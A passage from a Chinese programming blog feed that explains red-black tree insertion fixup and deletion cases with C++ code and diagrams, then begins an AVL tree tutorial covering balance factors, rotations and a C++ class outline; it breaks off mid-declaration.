<h5 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RedBlackTree::RedBlack_insertFixup</span><span class="params">(RBNodeEntry *pNode)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 父节点</span></span><br><span class="line">    RBNodeEntry *parent=<span class="literal">nullptr</span>;</span><br><span class="line">    <span class="comment">// 爷爷节点</span></span><br><span class="line">    RBNodeEntry *gparent=<span class="literal">nullptr</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果父节点存在且为红色</span></span><br><span class="line">    <span class="keyword">while</span>((parent=pNode-&gt;parent) &amp;&amp; parent-&gt;color==RED)&#123;</span><br><span class="line">        gparent=parent-&gt;parent;</span><br><span class="line">        <span class="comment">// L-型</span></span><br><span class="line">        <span class="keyword">if</span>(parent==gparent-&gt;leftChild)&#123;        </span><br><span class="line">            RBNodeEntry * uncle=gparent-&gt;rightChild;</span><br><span class="line">            <span class="comment">// LLr/LRr型 叔叔节点是红色，那么直接换色</span></span><br><span class="line">            <span class="keyword">if</span>(uncle!=m_Nil &amp;&amp; uncle-&gt;color==RED)&#123;</span><br><span class="line">                parent-&gt;color=BLACK;</span><br><span class="line">                uncle-&gt;color=BLACK;</span><br><span class="line">                gparent-&gt;color=RED;</span><br><span class="line">                <span class="comment">// 从当前爷爷节点开始继续向上调整</span></span><br><span class="line">                pNode=gparent;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">// LRb，叔叔节点gr是黑色节点(可以Nil)，且当前节点是父节点的右孩子</span></span><br><span class="line">            <span class="comment">// 将LRb转化为LLb型</span></span><br><span class="line">            &#125;<span class="keyword">if</span>(pNode==parent-&gt;rightChild)&#123;</span><br><span class="line">                <span class="comment">// 对父节点左旋</span></span><br><span class="line">                leftRotate(parent);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 处理LLb的情况</span></span><br><span class="line">            <span class="comment">// 先换色，在旋转</span></span><br><span class="line">            parent-&gt;color=BLACK;</span><br><span class="line">            gparent-&gt;color=RED;</span><br><span class="line">            rightRotate(gparent);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// R-型</span></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            RBNodeEntry *uncle=gparent-&gt;leftChild;</span><br><span class="line">            <span class="comment">// RLr/RRr型 叔叔节点是红色</span></span><br><span class="line">            <span class="keyword">if</span> (uncle!=m_Nil &amp;&amp; uncle-&gt;color==RED)&#123;</span><br><span class="line">                uncle-&gt;color=BLACK;</span><br><span class="line">                parent-&gt;color=BLACK;</span><br><span class="line">                gparent-&gt;color=RED;</span><br><span class="line">                <span class="comment">// 继续向上调整</span></span><br><span class="line">                pNode=gparent;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">             <span class="comment">// RLb型 叔叔是黑色，且当前节点是左孩子</span></span><br><span class="line">             <span class="comment">// 转化为 RRb</span></span><br><span class="line">            &#125; <span class="keyword">if</span>(pNode==parent-&gt;leftChild)&#123;</span><br><span class="line">                rightRotate(parent);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// RRb型</span></span><br><span class="line">            parent-&gt;color=BLACK;</span><br><span class="line">            gparent-&gt;color=RED;</span><br><span class="line">            leftRotate(gparent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 根节点必须为黑色！</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;m_RB_Root-&gt;color=BLACK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h4><p>红黑树删除类似BST，删除操作的前半部分代码一样，差别在于删除后红黑树的修正。事实上删除操作的修正要十分复杂，要考虑的情况较多。</p>
<ul>
<li>在红黑树中查找该节点是否存在；</li>
<li>若存在左子树和右子树，寻找<code>前驱/后继节点</code>将其转化为<code>只有一个子树/叶子</code>情况；</li>
<li>根据<code>child节点</code>、<code>child的兄弟节点</code>、<code>child的父节点</code>修正删除后的红黑树；</li>
<li>删除该节点。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">RedBlackTree::Remove</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    RBNodeEntry *node=Search(<span class="keyword">this</span>-&gt;m_RB_Root,key);</span><br><span class="line">    <span class="keyword">if</span>(!node)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    RBNodeEntry *child=m_Nil;</span><br><span class="line">    RBNodeEntry *parent=<span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存在左子树和右子树，将其转化为只有一个子树/叶子情况</span></span><br><span class="line">    <span class="keyword">if</span> (node-&gt;leftChild!=m_Nil &amp;&amp; node-&gt;rightChild!=m_Nil) &#123;</span><br><span class="line">        <span class="comment">// 后继节点，即将是要被删除的节点</span></span><br><span class="line">        RBNodeEntry *successor = <span class="keyword">this</span>-&gt;successor(node);</span><br><span class="line">        <span class="comment">// 数据替换</span></span><br><span class="line">        node-&gt;key=successor-&gt;key;</span><br><span class="line">        node-&gt;data=successor-&gt;data;</span><br><span class="line">        <span class="comment">// 删除后继节点</span></span><br><span class="line">        node=successor;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 若node是叶子节点那么leftChild=rightChild=m_Nil</span></span><br><span class="line">    <span class="keyword">if</span>(node-&gt;leftChild!=m_Nil)&#123;</span><br><span class="line">        child=node-&gt;leftChild;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        child=node-&gt;rightChild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 即使child是Nil也要设置child的parent。因为removeFixup需要parent来修正</span></span><br><span class="line">    child-&gt;parent=node-&gt;parent;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除的是根节点</span></span><br><span class="line">    <span class="keyword">if</span>(node-&gt;parent==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;m_RB_Root=child;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(node-&gt;parent-&gt;leftChild==node)&#123;</span><br><span class="line">        node-&gt;parent-&gt;leftChild=child;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        node-&gt;parent-&gt;rightChild=child;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(node-&gt;color==BLACK)&#123;</span><br><span class="line">        RedBlack_removeFixup(child);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 直接删除节点即可</span></span><br><span class="line">    <span class="keyword">delete</span> node;</span><br><span class="line">    node=<span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="RemoveFixup"><a href="#RemoveFixup" class="headerlink" title="RemoveFixup"></a>RemoveFixup</h4><p>给出下图的删除操作所引起的不平衡情况模板<br><img src="/uploads/images/data_structure/rbtree_cpp/31.png" alt><br>其中<code>白色节点</code>处于<code>未定型状态</code>，表示可以为黑/红/节点甚至Nil节点，但根节点一定是黑色节点。<code>节点u</code>表示删除节点的<code>child节点</code>。</p>
<p>我们首先讨论删除<code>黑色节点</code>的复杂情况。而且是上图的第一个模板，另一个也是类似的（旋转方向相反）。</p>
<h5 id="删除黑色节点"><a href="#删除黑色节点" class="headerlink" title="删除黑色节点"></a>删除黑色节点</h5><p>删除黑色节点引起的不平衡大致有4种情况：</p>
<ul>
<li>Case1：<code>兄弟节点brother</code>为<code>红色</code>；</li>
<li>Case2：<code>兄弟节点brother</code>为<code>黑色</code>，而且<code>brother</code>的<code>两个child</code>也都是黑色；</li>
<li>Case3：<code>兄弟节点brother</code>为<code>黑色</code>，而且<code>brother</code>的<code>leftchild</code>是红色，<code>rightchild</code>是黑色；</li>
<li>Case4：<code>兄弟节点brother</code>为<code>黑色</code>，而且<code>brother</code>的<code>rightchild</code>是红色。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/32.png" alt></p>
<h6 id="Case1"><a href="#Case1" class="headerlink" title="Case1"></a>Case1</h6><p>这种情况下是<code>兄弟节点brother</code>为<code>红色</code>，那么<code>parent节点</code>一定黑色。修正过程为：</p>
<ul>
<li>将<code>兄弟节点brother</code>染成<code>黑色</code>；</li>
<li>将<code>u的父节点parent</code>染成<code>红色</code>；</li>
<li>对<code>parent</code>进行<code>左旋</code>；</li>
<li>移动<code>brother</code>到<code>u的父节点parent</code>的<code>右孩子rightchild</code>。</li>
</ul>
<p>注意，这种情况下修正还没有结束！<br><img src="/uploads/images/data_structure/rbtree_cpp/33.png" alt></p>
<p>假设存在如下红黑树，删除节点a后为<code>case 1</code>情况，然而经过第一次修正发现并没有完全平衡，不过经过<code>case 1</code>却意外的进入了<code>case 2/3/4</code>，那么就继续修正。<br><img src="/uploads/images/data_structure/rbtree_cpp/34.png" alt></p>
<h6 id="Case2"><a href="#Case2" class="headerlink" title="Case2"></a>Case2</h6><p>这种情况是：<code>brother</code>为<code>黑色</code>，而且<code>brother</code>的<code>两个child</code>也都是黑色。修正的方法如下：</p>
<ul>
<li>将<code>brother</code>染成<code>红色</code>；</li>
<li>移动<code>u</code>到其<code>父节点parent</code>；</li>
</ul>
<p>至此，再根据<code>u</code>(图中的<code>B</code>)的颜色可以分两种情况：</p>
<ul>
<li><code>u</code>是<code>红色</code>，结束修正同时把<code>u</code>染成<code>黑色</code>；</li>
<li><code>u</code>是<code>黑色且不是根节点root</code>，则继续下一轮修正过程，再根据不同情况进行修正。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/35.png" alt></p>
<h6 id="Case3"><a href="#Case3" class="headerlink" title="Case3"></a>Case3</h6><p>这种情况是：<code>brother</code>为<code>黑色</code>，而且<code>brother</code>的<code>leftchild</code>是红色，<code>rightchild</code>是黑色。修正的方法如下：</p>
<ul>
<li>将<code>brother</code>的<code>左孩子leftchild</code>染成<code>黑色</code>；</li>
<li>将<code>brother</code>染成<code>红色</code>；</li>
<li>对<code>brother</code>右旋；</li>
<li>移动<code>brother</code>到<code>u的父节点parent</code>的<code>右孩子rightchild</code>。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/36.png" alt></p>
<h6 id="Case4"><a href="#Case4" class="headerlink" title="Case4"></a>Case4</h6><p>这是最后一种情况了：<code>brother</code>为<code>黑色</code>，而且<code>brother</code>的<code>rightchild</code>是红色。修正方法：</p>
<ul>
<li>将<code>brother</code>染成<code>u的父节点parent</code>的颜色(黑或红)；</li>
<li>将<code>parent</code>染成黑色；</li>
<li>将<code>brother</code>的<code>右孩子rightchild</code>染成黑色；</li>
<li>对<code>parent</code>左旋；</li>
<li>移动<code>u</code>移至<code>根节点root</code>，用于结束修正循环（图中节点b只是起演示作用，不一定为root）；</li>
<li>最后修改根节点root颜色为黑色。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/37.png" alt></p>
<p>总结以上4种情况，它们之间的转化关系大概如下：</p>
<ul>
<li>Case1-&gt;Case2/3/4</li>
<li>Case3-&gt;Case4</li>
<li>Case1-&gt;Case3-&gt;Case4</li>
</ul>
<p>修正完Case4就说明红黑树平衡了</p>
<h6 id="Case5"><a href="#Case5" class="headerlink" title="Case5"></a>Case5</h6><p>其实这类情况最简单了，也就是删除一个<code>黑色节点p</code>，但其<code>子节点child</code>是一个<code>红色节点</code>，无论黑色节点p的父节点是黑色还是红色。这样的话根本没必要再去考虑上述4种情况了。</p>
<ul>
<li>删除黑色节点，如果存在<code>红色child节点</code>，那么将其染成<code>黑色</code>。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/38.png" alt></p>
<h5 id="删除红色节点"><a href="#删除红色节点" class="headerlink" title="删除红色节点"></a>删除红色节点</h5><p>删除红色节点可能是删除叶子节点或者含有子树的节点。前者很容易实现，对于后者需要找到一个<code>前驱/后继节点</code>，而这个前驱/后继节点可能是黑色或红色的。如果是红色，那就删除该红色前驱/后继节点并向上修正直到平衡；如果是黑色，那么就判断不同的情况<code>case1/2/3/4/5</code>并进行修正；</p>
<p>删除红色节点55，前驱节点53也是红色节点<br><img src="/uploads/images/data_structure/rbtree_cpp/39.png" alt></p>
<p>删除红色节点65，前驱节点60是黑色节点，需要进入<code>case3</code>和<code>case4</code>修正过程；<br>删除红色节点65，后继节点67是红色节点。<br><img src="/uploads/images/data_structure/rbtree_cpp/40.png" alt></p>
<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p>为了说明情况，现在以下面这棵红黑树为例子来说明删除操作。<br><img src="/uploads/images/data_structure/rbtree_cpp/41.png" alt></p>
<p>删除<code>黑色节点55</code>，由于其子节点为<code>Nil</code>，故形成如下的<code>case4</code>：</p>
<ul>
<li>将<code>兄弟节点57</code>染成<code>u节点Nil</code>的<code>父节点56</code>的<code>红色</code>；</li>
<li>将<code>父节点56</code>染成<code>黑色</code>和<code>兄弟节点57</code>的<code>右节点58</code>染成<code>黑色</code>；</li>
<li>对<code>父节点56</code>左旋；</li>
<li>移动<code>u</code>移至根节点root，结束修正循环；</li>
<li>修改<code>根节点root</code>颜色为黑色。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/42.png" alt><br>最终效果<br><img src="/uploads/images/data_structure/rbtree_cpp/43.png" alt><br>删除<code>黑色节点58</code>，由于其子节点也为<code>Nil</code>，故形成如下的<code>case2</code>：</p>
<ul>
<li>将<code>兄弟节点56</code>染成<code>红色</code>；</li>
<li>移动<code>u</code>到其<code>父节点57</code>；</li>
<li>由于<code>u</code>是<code>红色</code>的，因此把<code>父节点57</code>染成<code>黑色</code>；</li>
<li>结束修正。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/44.png" alt><br>最终效果<br><img src="/uploads/images/data_structure/rbtree_cpp/45.png" alt><br>现在删除<code>黑色节点60</code>，由于其存在左右子树，因此需要寻找前驱/后继节点，此处寻找得<code>前驱黑色节点57</code>，替换<code>前驱黑色节点57</code>键值到<code>黑色节点60</code>。此时转化为删除<code>前驱黑色节点57</code>后形成<code>case5</code>，由于其<code>子节点56</code>为红色，故删除了<code>前驱黑色节点57</code>后，将<code>子节点56</code>染成<code>黑色</code>并结束修正。<br><img src="/uploads/images/data_structure/rbtree_cpp/46.png" alt></p>
<p>上述演示过程<br><img src="/uploads/images/data_structure/rbtree_cpp/47.gif" alt></p>
<h5 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RedBlackTree::RedBlack_removeFixup</span><span class="params">(RBNodeEntry*node)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// case5:</span></span><br><span class="line">    <span class="comment">// 若node是红色，那么把子节点node直接染黑</span></span><br><span class="line">    <span class="comment">// 若node是root，那么也把它直接染黑</span></span><br><span class="line">    <span class="keyword">while</span> (node!=m_RB_Root &amp;&amp; node-&gt;color==BLACK) &#123;</span><br><span class="line">        <span class="comment">// node是左节点</span></span><br><span class="line">        <span class="keyword">if</span> (node==node-&gt;parent-&gt;leftChild) &#123;</span><br><span class="line">            RBNodeEntry *brother=node-&gt;parent-&gt;rightChild;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            case1:</span></span><br><span class="line"><span class="comment">            case1最终转化为case2/3/4</span></span><br><span class="line"><span class="comment">                1.将兄弟节点brother染成黑色；</span></span><br><span class="line"><span class="comment">                2.将node的父节点parent染成红色；</span></span><br><span class="line"><span class="comment">                3.对parent进行左旋；</span></span><br><span class="line"><span class="comment">                4.移动brother到node的父节点parent的右孩子rightchild。</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">if</span>(brother-&gt;color==RED)&#123;</span><br><span class="line">                brother-&gt;color=BLACK;</span><br><span class="line">                node-&gt;parent-&gt;color=RED;</span><br><span class="line">                leftRotate(node-&gt;parent);</span><br><span class="line">                brother=node-&gt;parent-&gt;rightChild;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            case2:(单独处理)</span></span><br><span class="line"><span class="comment">                1.将brother染成红色；</span></span><br><span class="line"><span class="comment">                2.移动node到其父节点parent；</span></span><br><span class="line"><span class="comment">            */</span>    </span><br><span class="line">            <span class="keyword">if</span>(brother-&gt;leftChild-&gt;color==BLACK&amp;&amp;brother-&gt;rightChild-&gt;color==BLACK)&#123;</span><br><span class="line">                brother-&gt;color=RED;</span><br><span class="line">                node=node-&gt;parent;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// case3-&gt;case4</span></span><br><span class="line">            <span class="keyword">else</span> &#123;   </span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                case3:</span></span><br><span class="line"><span class="comment">                    1.将brother的左孩子leftchild染成黑色；</span></span><br><span class="line"><span class="comment">                    2.将brother染成红色；</span></span><br><span class="line"><span class="comment">                    3.对brother右旋；</span></span><br><span class="line"><span class="comment">                    4.移动brother到node的父节点parent的右孩子rightchild。</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                <span class="keyword">if</span>(brother-&gt;rightChild-&gt;color==BLACK)&#123;</span><br><span class="line">                    brother-&gt;leftChild-&gt;color=BLACK;</span><br><span class="line">                    brother-&gt;color=RED;</span><br><span class="line">                    rightRotate(brother);</span><br><span class="line">                    brother=node-&gt;parent-&gt;rightChild;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                case4:</span></span><br><span class="line"><span class="comment">                    1.将brother染成node的父节点parent的颜色(黑或红)；</span></span><br><span class="line"><span class="comment">                    2.将parent染成黑色；</span></span><br><span class="line"><span class="comment">                    3.将brother的右孩子rightchild染成黑色；</span></span><br><span class="line"><span class="comment">                    4.对parent左旋；</span></span><br><span class="line"><span class="comment">                    5.移动node移至根节点root，用于结束修正循环。</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                brother-&gt;color=node-&gt;parent-&gt;color;</span><br><span class="line">                node-&gt;parent-&gt;color=BLACK;</span><br><span class="line">                brother-&gt;rightChild-&gt;color=BLACK;</span><br><span class="line">                leftRotate(node-&gt;parent);</span><br><span class="line">                node=<span class="keyword">this</span>-&gt;m_RB_Root;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// node是右节点</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            RBNodeEntry *brother=node-&gt;parent-&gt;leftChild;</span><br><span class="line">            <span class="comment">// case1-&gt;case2/3/4:</span></span><br><span class="line">            <span class="keyword">if</span> (brother-&gt;color == RED) &#123;</span><br><span class="line">                brother-&gt;color = BLACK;</span><br><span class="line">                node-&gt;parent-&gt;color = RED;</span><br><span class="line">                rightRotate(node-&gt;parent);</span><br><span class="line">                brother = node-&gt;parent-&gt;leftChild;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// case2:</span></span><br><span class="line">            <span class="keyword">if</span> (brother-&gt;leftChild-&gt;color == BLACK&amp;&amp;brother-&gt;rightChild-&gt;color == BLACK) &#123;</span><br><span class="line">                brother-&gt;color = RED;</span><br><span class="line">                node = node-&gt;parent;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// case3:</span></span><br><span class="line">                <span class="keyword">if</span> (brother-&gt;leftChild-&gt;color == BLACK)&#123;</span><br><span class="line">                    brother-&gt;rightChild-&gt;color = BLACK;</span><br><span class="line">                    brother-&gt;color = RED;</span><br><span class="line">                    leftRotate(brother);</span><br><span class="line">                    brother = node-&gt;parent-&gt;leftChild;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// case4: </span></span><br><span class="line">                brother-&gt;color = node-&gt;parent-&gt;color;</span><br><span class="line">                node-&gt;parent-&gt;color = BLACK;</span><br><span class="line">                brother-&gt;leftChild-&gt;color = BLACK;</span><br><span class="line">                rightRotate(node-&gt;parent);</span><br><span class="line">                node = <span class="keyword">this</span>-&gt;m_RB_Root;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 即使node是Nil也染黑</span></span><br><span class="line">    node-&gt;color=BLACK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h4><p>红黑树实在是太复杂了，还得慢慢来～关于红黑树和AVL树差别，可以看看 <a href="https://stackoverflow.com/questions/13852870/red-black-tree-over-avl-tree" target="_blank" rel="noopener">https://stackoverflow.com/questions/13852870/red-black-tree-over-avl-tree</a><br>篇幅有限，红黑树全部源码就不全放出来了，毕竟也参考了别人写的，仅供学习罢了～<br>有兴趣的可以去看看本文红黑树大概实现源码：<a href="https://josephxrays.coding.net/p/rbt_cpp_learn/d/rbt_cpp_learn/git" target="_blank" rel="noopener">源码链接</a></p>
<p>总之，红黑树上红黑果，红黑树下你和我～</p>
<p>bye~</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://zh.wikipedia.org/zh-hans/%E7%BA%A2%E9%BB%91%E6%A0%91" target="_blank" rel="noopener">红黑树-维基百科</a><br><a href="http://alrightchiu.github.io/SecondRound/red-black-tree-introjian-jie.html" target="_blank" rel="noopener">Red Black Tree: Intro(簡介)</a><br><a href="https://riteme.site/blog/2016-3-12/2-3-tree-and-red-black-tree.html" target="_blank" rel="noopener">2-3树与红黑树</a><br>《数据结构、算法与应用 C++语言描述》</p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
        <tag>红黑树</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-AVL树</title>
    <url>/avl-tree-cpp/</url>
    <content><![CDATA[<p>AVL树是最早被发明的<strong>自平衡二叉查找树</strong>。其查找、插入和删除在<strong>平均</strong>和<strong>最坏</strong>情况下的时间复杂度都是 $O(\log n)$。AVL树由<strong>G. M. Adelson-Velsky</strong>和<strong>Evgenii Landis</strong>发明，AVL树的名称取自他们名字中的字母。</p>
<a id="more"></a>
<h3 id="AVL树"><a href="#AVL树" class="headerlink" title="AVL树"></a>AVL树</h3><p>在讨论AVL树之前先来看一下这张表</p>
<table>
   <tr>
        <td rowspan="2" align="center">方法</td>
        <td colspan="3" align="center">最坏情况</td>
        <td colspan="3" align="center">平均情况</td>
   </tr>
   <tr>
   <td>查找</td><td>插入</td><td>删除</td><td>查找</td><td>插入</td><td>删除</td></tr>
   <tr>
   <td align="center">有序数组</td>
   <td>logn</td><td>n</td><td>n</td><td>logn</td><td>n</td><td>n</td></tr>
   <tr><td align="center">有序链表</td>
   <td>n</td><td>n</td><td>n</td><td>n</td><td>n</td><td>n</td></tr>
   <tr><td align="center">跳表</td>
   <td>n</td><td>n</td><td>n</td><td>logn</td><td>logn</td><td>logn</td></tr>
   <tr><td align="center">哈希表</td>
   <td>n</td><td>n</td><td>n</td><td>1</td><td>1</td><td>1</td></tr>
   <tr><td align="center">BST</td>
   <td>n</td><td>n</td><td>n</td><td>logn</td><td>logn</td><td>logn</td></tr>
   <tr><td align="center">AVL树</td>
   <td>logn</td><td>logn</td><td>logn</td><td>logn</td><td>logn</td><td>logn</td></tr>
   <tr><td align="center">红黑树</td>
   <td>logn</td><td>logn</td><td>logn</td><td>logn</td><td>logn</td><td>logn</td></tr>
</table>

<p>在最坏情况下二叉查找树的复杂度为 $O(n)$，这种情况下BST出现严重“畸形”，或者退化成单链表。<br><img src="/uploads/images/data_structure/avlTree_cpp/01.png" alt></p>
<p>这些情况确实存在，那么如何保证不会出现“一边倒”情况呢？这时AVL树就该登场了。</p>
<p>首先来回顾之前的文章，了解到二叉查找树的性质3：</p>
<blockquote>
<p>一棵二叉树有$n$个元素，$n&gt;0$，它的高度最大为$n$，最小高度为$\lceil log_2(n+1) \rceil$。</p>
</blockquote>
<p>AVL树要做的就是将 高度最大为$n$ 的情况尽可能的转化为 最小高度为$\lceil log_2(n+1) \rceil$ 。</p>
<p><strong>AVL树也是二叉查找树！！！</strong></p>
<h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><ul>
<li>一棵n个元素的AVL树高度为$O(\log n)$</li>
<li>对一棵n个元素的AVL树，在$O(高度)=O(\log n)$ 时间内可以实现查找操作</li>
<li>对一棵n个元素的AVL树插入和删除，时间复杂度为$O(\log n)$ </li>
</ul>
<h4 id="平衡因子bf"><a href="#平衡因子bf" class="headerlink" title="平衡因子bf"></a>平衡因子bf</h4><p>AVL树是通过平衡因子来调整二叉查找树结构使其平衡,且AVL树的平衡因子只能是 <strong>1、-1、0</strong>，否则该树不是AVL树<br>节点$x$的平衡因子$bf(x)=x\ 的左子树高度-x\ 的右子树高度$<br>由于平衡因子bf的限定，使得AVL树变成<strong>严格平衡</strong>二叉查找树</p>
<p><img src="/uploads/images/data_structure/avlTree_cpp/02.png" alt></p>
<h3 id="AVL树的旋转"><a href="#AVL树的旋转" class="headerlink" title="AVL树的旋转"></a>AVL树的旋转</h3><p>造成二叉查找树的不平衡来自于插入和删除操作，在插入或删除一个节点时有几种不平衡状态，分别为“左左/LL”、“左右/LR”、“右右/RR”、“右左/RL”。AVL树要做的，就是处理这些不平衡结构。<br><img src="/uploads/images/data_structure/avlTree_cpp/03.png" alt></p>
<p>插入或删除一个节点后，导致根节点的 <strong>平衡因子=左子树的高度-右子树的高度=2</strong>，结果AVL树失去了平衡</p>
<h4 id="LL"><a href="#LL" class="headerlink" title="LL"></a>LL</h4><p>旋转过程：<br>将<strong>平衡因子=2</strong>的根节点X的<strong>左节点L</strong>作为旋转后的根节点，同时将L的右孩子调整为X的左孩子。<br>最后更新各个节点的bf</p>
<p><img src="/uploads/images/data_structure/avlTree_cpp/04.png" alt></p>
<h4 id="RR"><a href="#RR" class="headerlink" title="RR"></a>RR</h4><p>旋转过程：<br>将<strong>平衡因子=2</strong>的根节点X的<strong>右节点R</strong>作为旋转后的根节点，同时将R的左孩子调整为X的右孩子。<br>最后更新各个节点的bf</p>
<p><img src="/uploads/images/data_structure/avlTree_cpp/05.png" alt></p>
<h4 id="LR"><a href="#LR" class="headerlink" title="LR"></a>LR</h4><p>LR型旋转需要两次旋转，即先左旋(RR)后右旋(LL)<br>首先围绕不平衡根节点bf=2的<strong>左孩子</strong>进行左旋，再围绕<strong>根节点</strong>进行右旋</p>
<p><img src="/uploads/images/data_structure/avlTree_cpp/06.png" alt></p>
<h4 id="RL"><a href="#RL" class="headerlink" title="RL"></a>RL</h4><p>RL型旋转也需要两次旋转，即先右旋(LL)后左旋(RR)<br>首先围绕不平衡根节点bf=2的<strong>右孩子</strong>进行右旋，再围绕<strong>根节点</strong>进行左旋</p>
<p><img src="/uploads/images/data_structure/avlTree_cpp/07.png" alt></p>
<h3 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h3><p>首先定义一个节点结构体</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">AVLNodeEntry</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    T data;</span><br><span class="line">    <span class="keyword">int</span> height;</span><br><span class="line">    AVLNodeEntry *parent;</span><br><span class="line">    AVLNodeEntry *left_nodes;</span><br><span class="line">    AVLNodeEntry *right_nodes;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>AVL树模板类</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">AVLTree</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    AVLNodeEntry&lt;T&gt;* m_NodeRoot;</span><br><span class="line">    <span class="keyword">int</span> m_binaryTree_length;</span><br><span class="line">    <span class="keyword">int</span> m_m_binaryTree_maxKey;</span><br><span class="line">    <span class="keyword">int</span> m_m_binaryTree_minKey;</span><br><span class="line">    <span class="keyword">bool</span> m_isClear;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    AVLTree();</span><br><span class="line">    AVLTree(<span class="keyword">int</span>  k,<span class="keyword">const</span> T&amp; v);</span><br><span class="line">    ~AVLTree();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">Height</span><span class="params">(AVLNodeEntry&lt;T&gt;* pNode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Insert</span><span class="params">(AVLNodeEntry&lt;T&gt;* &amp; pNode,AVLNodeEntry&lt;T&gt;* pNodeParent,<span class="keyword">int</span> key,<span class="keyword">const</span> T&amp; value)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">Remove</span><span class="params">(AVLNodeEntry&lt;T&gt;* pNode,<span class="keyword">int</span> key)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">(AVLNodeEntry&lt;T&gt;* &amp; pNode,<span class="keyword">int</span> 